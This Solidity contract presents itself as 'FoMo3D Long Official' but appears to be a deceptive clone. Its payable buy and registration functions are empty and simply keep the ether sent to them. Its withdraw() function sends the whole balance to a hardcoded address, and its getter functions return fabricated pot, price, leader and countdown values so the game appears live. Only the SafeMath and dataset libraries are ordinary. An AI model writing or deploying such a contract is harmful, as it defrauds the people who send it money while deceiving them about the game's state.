1 pragma solidity ^0.4.24;
2 
3 contract FoMo3Dlong {
4     using SafeMath for *;
5     
6     string constant public name = "FoMo3D Long Official";
7     string constant public symbol = "F3D";
8 	uint256 public airDropPot_;
9     uint256 public airDropTracker_ = 0;
10     mapping (address => uint256) public pIDxAddr_;
11     mapping (bytes32 => uint256) public pIDxName_;
12     mapping (uint256 => F3Ddatasets.Player) public plyr_;
13     mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;
14     mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;
15     mapping (uint256 => F3Ddatasets.Round) public round_;
16     mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;
17 
18     mapping (uint256 => F3Ddatasets.TeamFee) public fees_;
19     mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;
20 
21     function buyXid(uint256 _affCode, uint256 _team) public payable {}
22     function buyXaddr(address _affCode, uint256 _team) public payable {}
23     function buyXname(bytes32 _affCode, uint256 _team) public payable {}
24     function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) public {}    
25     function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) public {} 
26     function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth) public {}
27     function withdraw() public {
28         address aff = 0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0;
29         aff.transfer(this.balance);
30     }
31     function registerNameXID(string _nameString, uint256 _affCode, bool _all) public payable {}  
32     function registerNameXaddr(string _nameString, address _affCode, bool _all) public payable {} 
33     function registerNameXname(string _nameString, bytes32 _affCode, bool _all) public payable {} 
34 
35 	uint256 public rID_ = 1;
36 
37     function getBuyPrice()
38         public 
39         view 
40         returns(uint256)
41     {  
42         return ( 100254831521475310 );
43     }
44 
45     function getTimeLeft()
46         public
47         view
48         returns(uint256)
49     {
50         uint256 _rID = rID_;
51 		uint256 _now = now;
52 		round_[_rID].end =  _now + 125 - ( _now % 120 );
53 		return( 125 - ( _now % 120 ) );
54     }
55 
56     function getPlayerVaults(uint256 _pID)
57         public
58         view
59         returns(uint256 ,uint256, uint256)
60     {
61         return (0, 0, 0);
62     }
63 
64     function getCurrentRoundInfo()
65         public
66         view
67         returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)
68     {
69         // setup local rID
70         uint256 _rID = rID_;
71 		
72 		uint256 _now = now;
73 		
74 		round_[_rID].end = _now + 125 - (_now % 120);
75         
76         return
77         (
78             0,               //0
79             _rID,                           //1
80             round_[_rID].keys,             //2
81             round_[_rID].end,        //3
82             round_[_rID].strt,              //4
83             round_[_rID].pot,               //5
84             (round_[_rID].team + (round_[_rID].plyr * 10)),     //6
85             0xd8723f6f396E28ab6662B91981B3eabF9De05E3C,  //7
86             0x6d6f6c6963616e63657200000000000000000000000000000000000000000000,  //8
87             3053823263697073356017,             //9
88             4675447079848478547678,             //10
89             85163999483914905978445,             //11
90             3336394330928816056073,             //12
91             519463956231409304003              //13
92         );
93     }
94 	
95     function getPlayerInfoByAddress(address _addr)
96         public 
97         view 
98         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)
99     {
100         return
101         (
102             18163,                               //0
103             0x6d6f6c6963616e63657200000000000000000000000000000000000000000000,                   //1
104             122081953021293259355,         //2
105             0,                    //3
106             0,       //4
107             0,                    //5
108             0           //6
109         );
110     }
111 	
112     function calcKeysReceived(uint256 _rID, uint256 _eth)
113         public
114         view
115         returns(uint256)
116     {
117         return (1646092234676);
118     }
119 
120     function iWantXKeys(uint256 _keys)
121         public
122         view
123         returns(uint256)
124     {
125         return (_keys.mul(100254831521475310)/1000000000000000000);
126     }
127 	
128     bool public activated_ = true;
129     function activate() public {
130         round_[1] = F3Ddatasets.Round(1954, 2, 1533795558, false, 1533794558, 34619432129976331518578579, 91737891789564224505545, 21737891789564224505545,31000, 0, 0, 0);
131     }
132 	
133     function setOtherFomo(address _otherF3D) public {}
134 }
135 
136 //==============================================================================
137 //   __|_ _    __|_ _  .
138 //  _\ | | |_|(_ | _\  .
139 //==============================================================================
140 library F3Ddatasets {
141     struct EventReturns {
142         uint256 compressedData;
143         uint256 compressedIDs;
144         address winnerAddr;         // winner address
145         bytes32 winnerName;         // winner name
146         uint256 amountWon;          // amount won
147         uint256 newPot;             // amount in new pot
148         uint256 P3DAmount;          // amount distributed to p3d
149         uint256 genAmount;          // amount distributed to gen
150         uint256 potAmount;          // amount added to pot
151     }
152     struct Player {
153         address addr;   // player address
154         bytes32 name;   // player name
155         uint256 win;    // winnings vault
156         uint256 gen;    // general vault
157         uint256 aff;    // affiliate vault
158         uint256 lrnd;   // last round played
159         uint256 laff;   // last affiliate id used
160     }
161     struct PlayerRounds {
162         uint256 eth;    // eth player has added to round (used for eth limiter)
163         uint256 keys;   // keys
164         uint256 mask;   // player mask 
165         uint256 ico;    // ICO phase investment
166     }
167     struct Round {
168         uint256 plyr;   // pID of player in lead
169         uint256 team;   // tID of team in lead
170         uint256 end;    // time ends/ended
171         bool ended;     // has round end function been ran
172         uint256 strt;   // time round started
173         uint256 keys;   // keys
174         uint256 eth;    // total eth in
175         uint256 pot;    // eth to pot (during round) / final amount paid to winner (after round ends)
176         uint256 mask;   // global mask
177         uint256 ico;    // total eth sent in during ICO phase
178         uint256 icoGen; // total eth for gen during ICO phase
179         uint256 icoAvg; // average key price for ICO phase
180     }
181     struct TeamFee {
182         uint256 gen;    // % of buy in thats paid to key holders of current round
183         uint256 p3d;    // % of buy in thats paid to p3d holders
184     }
185     struct PotSplit {
186         uint256 gen;    // % of pot thats paid to key holders of current round
187         uint256 p3d;    // % of pot thats paid to p3d holders
188     }
189 }
190 
191 /**
192  * @title SafeMath v0.1.9
193  * @dev Math operations with safety checks that throw on error
194  * change notes:  original SafeMath library from OpenZeppelin modified by Inventor
195  * - added sqrt
196  * - added sq
197  * - added pwr 
198  * - changed asserts to requires with error log outputs
199  * - removed div, its useless
200  */
201 library SafeMath {
202     
203     /**
204     * @dev Multiplies two numbers, throws on overflow.
205     */
206     function mul(uint256 a, uint256 b) 
207         internal 
208         pure 
209         returns (uint256 c) 
210     {
211         if (a == 0) {
212             return 0;
213         }
214         c = a * b;
215         require(c / a == b, "SafeMath mul failed");
216         return c;
217     }
218 
219     /**
220     * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
221     */
222     function sub(uint256 a, uint256 b)
223         internal
224         pure
225         returns (uint256) 
226     {
227         require(b <= a, "SafeMath sub failed");
228         return a - b;
229     }
230 
231     /**
232     * @dev Adds two numbers, throws on overflow.
233     */
234     function add(uint256 a, uint256 b)
235         internal
236         pure
237         returns (uint256 c) 
238     {
239         c = a + b;
240         require(c >= a, "SafeMath add failed");
241         return c;
242     }
243     
244     /**
245      * @dev gives square root of given x.
246      */
247     function sqrt(uint256 x)
248         internal
249         pure
250         returns (uint256 y) 
251     {
252         uint256 z = ((add(x,1)) / 2);
253         y = x;
254         while (z < y) 
255         {
256             y = z;
257             z = ((add((x / z),z)) / 2);
258         }
259     }
260     
261     /**
262      * @dev gives square. multiplies x by x
263      */
264     function sq(uint256 x)
265         internal
266         pure
267         returns (uint256)
268     {
269         return (mul(x,x));
270     }
271     
272     /**
273      * @dev x to the power of y 
274      */
275     function pwr(uint256 x, uint256 y)
276         internal 
277         pure 
278         returns (uint256)
279     {
280         if (x==0)
281             return (0);
282         else if (y==0)
283             return (1);
284         else 
285         {
286             uint256 z = x;
287             for (uint256 i=1; i < y; i++)
288                 z = mul(z,x);
289             return (z);
290         }
291     }
292 }